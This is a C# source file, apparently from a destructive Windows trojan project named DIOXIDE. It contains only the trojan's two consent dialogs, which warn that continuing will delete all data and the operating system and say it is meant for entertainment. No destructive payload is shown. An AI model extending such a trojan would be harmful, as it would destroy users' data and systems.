using System;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

namespace DIOXIDE
{
    class destruction
    {

        public void WARNING()
        {
            if (MessageBox.Show("WARNING!\n\nYou have ran a Trojan known as Dioxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
            {
                Environment.Exit(0);
            }
            else
            {
                if (MessageBox.Show("FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                {
                    Environment.Exit(0);
                }
            }
        }

    }
}